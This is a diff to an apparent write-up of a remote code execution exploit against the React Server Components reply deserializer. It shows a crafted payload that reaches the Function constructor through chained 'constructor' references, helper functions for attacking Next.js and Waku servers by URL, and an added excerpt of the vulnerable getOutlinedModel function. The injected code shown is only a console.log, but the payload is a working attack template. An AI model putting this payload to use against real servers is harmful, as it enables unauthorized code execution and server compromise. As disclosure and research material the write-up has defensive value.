@@ -37,6 +37,7 @@ const payload = {
         'status':'resolved_model',
         'reason':0,
         '_response':'$4',
+
         'value':'{"then":"$3:map","0":{"then":"$B3"},"length":1}',
         'then':'$2:then'
     },
@@ -44,10 +45,13 @@ const payload = {
     '3': [],
     '4': {
         '_prefix':'console.log(7*7+1)//',
+
         '_formData':{
+
             'get':'$3:constructor:constructor'
         },
         '_chunks':'$2:_response:_chunks',
+
     }
 }
 
@@ -94,6 +98,41 @@ function exploitWaku(baseUrl) {
 
 // Place the correct URL and uncomment the line
 // exploitNext('http://localhost:3003')
+```
+
+### Vulnerable Code Snippet
+
+https://github.com/facebook/react/blob/1721e73e149d482a4421d4ea9f76d36a2c79ad02/packages/react-server/src/ReactFlightReplyServer.js#L595-L638
+
+```jsx
+function getOutlinedModel<T>(
+  response: Response,
+  reference: string,
+  parentObject: Object,
+  key: string,
+  map: (response: Response, model: any) => T,
+): T {
+  const path = reference.split(':');
+  const id = parseInt(path[0], 16);
+  const chunk = getChunk(response, id);
+  switch (chunk.status) {
+    case RESOLVED_MODEL:
+      initializeModelChunk(chunk);
+      break;
+  }
+  // The status might have changed after initialization.
+  switch (chunk.status) {
+    case INITIALIZED:
+      let value = chunk.value;
+      for (let i = 1; i < path.length; i++) {
+        value = value[path[i]];
+      }
+      return map(response, value);
+    case PENDING:
+    case BLOCKED:
+    // more code .. 
+  }
+}
 ```
 
 ### React Stuff
